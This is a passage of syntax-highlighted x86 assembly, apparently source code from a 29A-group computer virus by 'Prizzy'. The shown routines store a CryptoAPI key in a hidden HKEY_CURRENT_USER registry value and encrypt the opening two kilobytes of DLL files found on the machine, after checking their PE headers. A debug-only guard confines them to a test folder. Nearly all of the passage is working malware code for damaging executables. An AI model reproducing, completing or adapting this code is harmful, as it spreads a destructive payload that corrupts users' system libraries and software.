        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptExportKey</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get simple blob key length</span><span class="sc0">

        </span><span class="sc1">; allocate memory for SIMPLE key (maximum 256 bytes)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobLen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobKey</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; export key into a simple key blob</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobLen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;length of simple key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;simple blob key buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;SIMPLEBLOB</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_XchgKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptExportKey</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;generate simple key</span><span class="sc0">

        </span><span class="sc1">; get other registery information</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80000001h</span><span class="sc0">       </span><span class="sc1">;HKEY_CURRENT_USER</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__regOpen</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cs_dealloc</span><span class="sc0">

        </span><span class="sc1">; create binary sub-key "Kiss Of Death" it'll be "SimpleKey"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobLen</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;size of value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of data buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">;REG_BINARY flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_RegFlag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;name of value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegSetValueExA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;update it :)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cs_dealloc_2</span><span class="sc0">

    </span><span class="sc5">__cs_close_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; close register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobHan</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;my register handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegCloseKey</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__cs_close_key</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; close cryptography key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Key</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;my generated key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptDestroyKey</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__cs_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cs_end</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptReleaseContext</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">__cs_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__cs_fault</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Action</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cs_finish</span><span class="sc0">

    </span><span class="sc5">__cs_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Action</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cs_close_key</span><span class="sc0">

    </span><span class="sc5">__cs_dealloc_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_BlobKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Action</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cs_close_reg</span><span class="sc0">


        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function  checks  whether "Kiss Of Death"  exists in</span><span class="sc0">
        </span><span class="sc1">;"Prizzy/29A" cryptography  register-class. All is because</span><span class="sc0">
        </span><span class="sc1">;of CSP generating public key.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__csck_regHan</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;register handle</span><span class="sc0">
        </span><span class="sc5">__csck_regFlag</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;register type flag</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">__cs_created_key</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; open register folder "Prizzy/29A"</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__csck_regHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80000001h</span><span class="sc0">       </span><span class="sc1">;HKEY_CURRENT_USER</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__regOpen</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__csck_fault</span><span class="sc0">

        </span><span class="sc1">; open binary sub-key "Kiss Of Death"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;address of data buffer size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;address of data buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__csck_regFlag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;REG_BINARY flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_RegFlag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;name of value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__csck_regHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegQueryValueExA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__csck_regHan</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;close register folder</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegCloseKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__csck_fault</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__csck_fault</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to crypt DLL file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function encrypts DLL file by Win32 Crypto functions</span><span class="sc0">
        </span><span class="sc1">;I will encode only two kilobytes.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Behaviour:</span><span class="sc0">
        </span><span class="sc1">;  * load SIMPLE key from reg</span><span class="sc0">
        </span><span class="sc1">;  * read 2008 bytes from DLL to memory</span><span class="sc0">
        </span><span class="sc1">;  * encrypt 1992 bytes</span><span class="sc0">
        </span><span class="sc1">;  * save last eight bytes because when i'll encode next</span><span class="sc0">
        </span><span class="sc1">;    eight bytes, WinAPI rewrite 16 bytes, not 8.</span><span class="sc0">
        </span><span class="sc1">;  * encrypt 8 bytes (in fact, it will be 16 bytes)</span><span class="sc0">
        </span><span class="sc1">;  * calculate CRC64 for that 8 bytes</span><span class="sc0">
        </span><span class="sc1">;  * save CRC64 and that 8 bytes to the end of file</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    search_filename ... DLL file name</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__cf_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library's handle</span><span class="sc0">
        </span><span class="sc5">__cf_FSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library's file size</span><span class="sc0">
        </span><span class="sc5">__cf_Memory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library's 2Kb body</span><span class="sc0">
        </span><span class="sc5">__cf_header</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;library's signature</span><span class="sc0">
        </span><span class="sc5">__cf_EncodeSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;real encoded size</span><span class="sc0">
        </span><span class="sc5">__cf_QwordCRC64</span><span class="sc0"> </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;Qword CRC64</span><span class="sc0">
        </span><span class="sc5">__cf_QWORD</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;bad WinAPI function</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt_file</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; don't call this function once again in actual time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; check unCrypted DLLs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_DLL_check</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cf_finish</span><span class="sc0">

        </span><span class="sc1">; check file, I don't wanna risk :) ["E:\XXXX\" directory]</span><span class="sc0">
    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc12">'X\:E'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cf_finish</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'\XXX'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cf_finish</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">; open DLL file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cf_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read its signature</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_header</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;bytes to read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cf_fClose</span><span class="sc0">

        </span><span class="sc1">; check its signature</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cf_fClose</span><span class="sc0">

        </span><span class="sc1">; get its file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_FSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">        </span><span class="sc1">;lesser then 5Kb ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__cf_fClose</span><span class="sc0">

        </span><span class="sc1">; allocate memory for 2 kilobytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2008</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read two kilobytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2008</span><span class="sc0">        </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cf_dealloc</span><span class="sc0">

        </span><span class="sc1">; get PE/NE signature</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc1">;no PE sign ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cf_dealloc</span><span class="sc0">

        </span><span class="sc1">; encrypt 1992 bytes (next 8 bytes will be with last flag)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_EncodeSize</span><span class="sc4">],</span><span class="sc2">1992</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000</span><span class="sc0">            </span><span class="sc1">;total bytes to encrypt</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_EncodeSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;real encoded size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;mem address</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;last block ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;hash</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;imported key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptEncrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cf_dealloc</span><span class="sc0">

        </span><span class="sc1">; save next two dwords to copro reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fsave</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_nl_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save all regz &amp; flagz</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">000007D0h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_QWORD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">frstor</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_nl_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;restore all regz &amp; flagz</span><span class="sc0">

        </span><span class="sc1">; encode next 8 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_EncodeSize</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000</span><span class="sc0">            </span><span class="sc1">;total bytes to encrypt</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_EncodeSize</span><span class="sc4">]</span><span class="sc0">
